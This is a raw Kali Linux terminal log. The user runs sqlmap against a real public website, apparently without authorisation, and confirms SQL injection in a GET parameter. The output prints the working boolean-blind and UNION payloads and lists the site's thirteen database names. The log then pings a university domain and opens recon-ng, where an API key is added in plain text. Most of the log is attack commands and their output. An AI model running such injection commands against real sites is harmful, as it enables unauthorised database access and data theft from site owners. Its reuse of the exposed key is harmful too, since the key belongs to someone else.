c64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=304 ttl=128 time=236 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=305 ttl=128 time=132 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=306 ttl=128 time=72.9 ms
^C
--- google.com ping statistics ---
306 packets transmitted, 298 received, 2.61438% packet loss, time 305761ms
rtt min/avg/max/mdev = 46.137/149.953/2631.945/268.724 ms, pipe 3
root@kali:~# sql -u https://www.bible-history.com
bash: sql: command not found
root@kali:~# sqlmap -u https://www.bible-history.com
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.8#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:01:55 /2019-09-08/

[05:01:57] [INFO] testing connection to the target URL
[05:02:00] [INFO] checking if the target is protected by some kind of WAF/IPS
[05:02:04] [INFO] testing if the target URL content is stable
[05:02:23] [INFO] target URL content is stable
[05:02:23] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--crawl=2'

[*] ending @ 05:02:23 /2019-09-08/

root@kali:~# sqlmap -u https://www.bible-history.com --dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:03:37 /2019-09-08/

[05:03:40] [INFO] testing connection to the target URL
[05:03:43] [INFO] testing if the target URL content is stable
[05:03:47] [INFO] target URL content is stable
[05:03:47] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--crawl=2'

[*] ending @ 05:03:47 /2019-09-08/

root@kali:~# sqlmap -u https://www.bible-history.com/subcat.php?id=1 --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.8#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:10:42 /2019-09-08/

[05:10:43] [INFO] testing connection to the target URL
[05:10:45] [INFO] checking if the target is protected by some kind of WAF/IPS
[05:10:47] [INFO] testing if the target URL content is stable
[05:10:48] [INFO] target URL content is stable
[05:10:48] [INFO] testing if GET parameter 'id' is dynamic
[05:10:51] [INFO] GET parameter 'id' appears to be dynamic
[05:10:55] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[05:10:57] [INFO] testing for SQL injection on GET parameter 'id'
[05:10:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:11:06] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="List")
[05:11:32] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[05:23:30] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:23:32] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:24:08] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests
[05:24:08] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[05:24:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:24:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:24:23] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:24:25] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:24:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:24:28] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:24:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:24:32] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:24:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:24:36] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:24:37] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:24:39] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:24:40] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:24:44] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:24:45] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:24:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[05:24:48] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:24:49] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:24:51] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:24:54] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:24:57] [INFO] testing 'MySQL inline queries'
[05:24:59] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[05:24:59] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[05:25:01] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[05:25:03] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[05:25:05] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[05:25:06] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[05:25:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[05:25:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:25:27] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[05:25:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[05:26:18] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[05:26:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[05:27:20] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[05:27:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[05:28:08] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[05:28:29] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query)'
[05:28:46] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query)'
[05:29:02] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query - comment)'
[05:29:18] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query - comment)'
[05:29:35] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[05:30:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[05:30:37] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[05:30:54] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[05:31:11] [INFO] testing 'MySQL AND time-based blind (ELT)'
[05:31:42] [INFO] testing 'MySQL OR time-based blind (ELT)'
[05:32:13] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[05:32:45] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[05:33:07] [WARNING] user aborted during detection phase
[05:33:17] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'/(q)uit] 

[05:33:20] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:33:25] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[05:33:35] [WARNING] user aborted during detection phase
[05:33:55] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'e verbosity/(q)uit] 
[05:34:13] [INFO] testing 'MySQL <= 5.0.11 time-based blind - Parameter replace (heavy queries)'
[05:34:14] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[05:34:16] [WARNING] user aborted during detection phase
how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit] quit
[05:34:19] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[05:34:51] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[05:35:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:35:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:35:32] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:35:39] [INFO] target URL appears to have 4 columns in query
[05:35:42] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[05:35:42] [WARNING] applying generic concatenation (CONCAT)
sqlmap -u https://www.bible-history.com/subcat.php?id=1 -D bible history
sqlmap identified the following injection point(s) with a total of 81 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8550=8550

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7170787871,0x6e45586158424a4e6b4f4b63624b4f46694e61446b496a716c6c67616a7277535550496d70686a55,0x717a6b7871),NULL,NULL-- CUBz
---
[05:44:41] [INFO] testing MySQL
[05:44:43] [INFO] confirming MySQL
[05:44:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[05:44:50] [INFO] fetching database names
available databases [13]:
[*] ancient_questions
[*] bible_glossary
[*] bible_history
[*] grosh
[*] hmc_hmcinspire
[*] infofaq
[*] information_schema
[*] kidsmaps
[*] mysql
[*] performance_schema
[*] rusty_ancient
[*] rusty_biblemaps
[*] rusty_even

[05:44:52] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.bible-history.com'

[*] ending @ 05:44:52 /2019-09-08/

root@kali:~# sqlmap -u https://www.bible-history.com/subcat.php?id=1 -D bible history --mysql --column
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python2 sqlmap [options]

sqlmap: error: no such option: --mysql
root@kali:~# sqlmap -u https://www.bible-history.com/subcat.php?id=1 -D bible history --information_scheme --column
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python2 sqlmap [options]

sqlmap: error: no such option: --information_scheme
root@kali:~# sqlmap -u https://www.bible-history.com/subcat.php?id=1 -D bible history
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:04:18 /2019-09-08/

[06:04:18] [INFO] resuming back-end DBMS 'mysql' 
[06:04:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8550=8550

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7170787871,0x6e45586158424a4e6b4f4b63624b4f46694e61446b496a716c6c67616a7277535550496d70686a55,0x717a6b7871),NULL,NULL-- CUBz
---
[06:04:21] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL 5 (MariaDB fork)
[06:04:21] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.bible-history.com'

[*] ending @ 06:04:21 /2019-09-08/

root@kali:~# sqlmap -u https://www.bible-history.com/subcat.php?id=1 -D bible history -t ^C
root@kali:~# ping lpu.in
PING lpu.in (49.50.65.62) 56(84) bytes of data.
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=1 ttl=128 time=2856 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=4 ttl=128 time=69.0 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=5 ttl=128 time=63.0 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=6 ttl=128 time=112 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=7 ttl=128 time=103 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=8 ttl=128 time=60.8 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=9 ttl=128 time=79.7 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=10 ttl=128 time=115 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=11 ttl=128 time=117 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=12 ttl=128 time=72.9 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=13 ttl=128 time=57.4 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=14 ttl=128 time=66.4 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=15 ttl=128 time=66.1 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=16 ttl=128 time=71.9 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=17 ttl=128 time=60.2 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=18 ttl=128 time=78.8 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=19 ttl=128 time=89.3 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=20 ttl=128 time=66.9 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=21 ttl=128 time=93.1 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=22 ttl=128 time=157 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=23 ttl=128 time=65.2 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=24 ttl=128 time=180 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=25 ttl=128 time=211 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=26 ttl=128 time=97.0 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=27 ttl=128 time=72.9 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=28 ttl=128 time=76.9 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=29 ttl=128 time=56.1 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=30 ttl=128 time=74.2 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=31 ttl=128 time=79.9 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=32 ttl=128 time=72.7 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=33 ttl=128 time=80.8 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=34 ttl=128 time=75.0 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=35 ttl=128 time=103 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=36 ttl=128 time=65.1 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=37 ttl=128 time=59.3 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=38 ttl=128 time=63.2 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=39 ttl=128 time=71.0 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=40 ttl=128 time=90.8 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=41 ttl=128 time=85.6 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=42 ttl=128 time=70.2 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=43 ttl=128 time=70.6 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=45 ttl=128 time=185 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=46 ttl=128 time=78.0 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=47 ttl=128 time=72.3 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=48 ttl=128 time=73.1 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=49 ttl=128 time=65.8 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=50 ttl=128 time=66.5 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=51 ttl=128 time=73.8 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=52 ttl=128 time=74.4 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=53 ttl=128 time=56.5 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=54 ttl=128 time=57.8 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=55 ttl=128 time=69.8 ms
64 bytes from 49.50.65.62 (49.50.65.62): icmp_seq=56 ttl=128 time=74.4 ms
^C
--- lpu.in ping statistics ---
57 packets transmitted, 53 received, 7.01754% packet loss, time 56224ms
rtt min/avg/max/mdev = 56.077/136.284/2856.343/378.571 ms, pipe 3
root@kali:~# ping os.lpu.in
ping: os.lpu.in: Name or service not known
root@kali:~# ping us.lpu.in
ping: us.lpu.in: Name or service not known
root@kali:~# recon-ng
[*] Version check disabled.

    _/_/_/    _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/
   _/    _/  _/        _/        _/      _/  _/_/    _/            _/_/    _/  _/       
  _/_/_/    _/_/_/    _/        _/      _/  _/  _/  _/  _/_/_/_/  _/  _/  _/  _/  _/_/_/
 _/    _/  _/        _/        _/      _/  _/    _/_/            _/    _/_/  _/      _/ 
_/    _/  _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/    


                                          /\
                                         / \\ /\
    Sponsored by...               /\  /\/  \\V  \/\
                                 / \\/ // \\\\\ \\ \/\
                                // // BLACK HILLS \/ \\
                               www.blackhillsinfosec.com

                  ____   ____   ____   ____ _____ _  ____   ____  ____
                 |____] | ___/ |____| |       |   | |____  |____ |
                 |      |   \_ |    | |____   |   |  ____| |____ |____
                                   www.practisec.com

                      [recon-ng v5.0.0, Tim Tomes (@lanmaster53)]                       

[*] No modules enabled/installed.

[recon-ng][default] > keys add ipinfodb api 6087bb14c88b6d9d00806b57f5cf9600097e011cf1a4d7666268b8343402354a
[*] Key 'ipinfodb' added.
[recon-ng][default] > use google
[!] Invalid command: use google.
[recon-ng][default] > use google.
[!] Invalid command: use google.
[recon-ng][default] > 


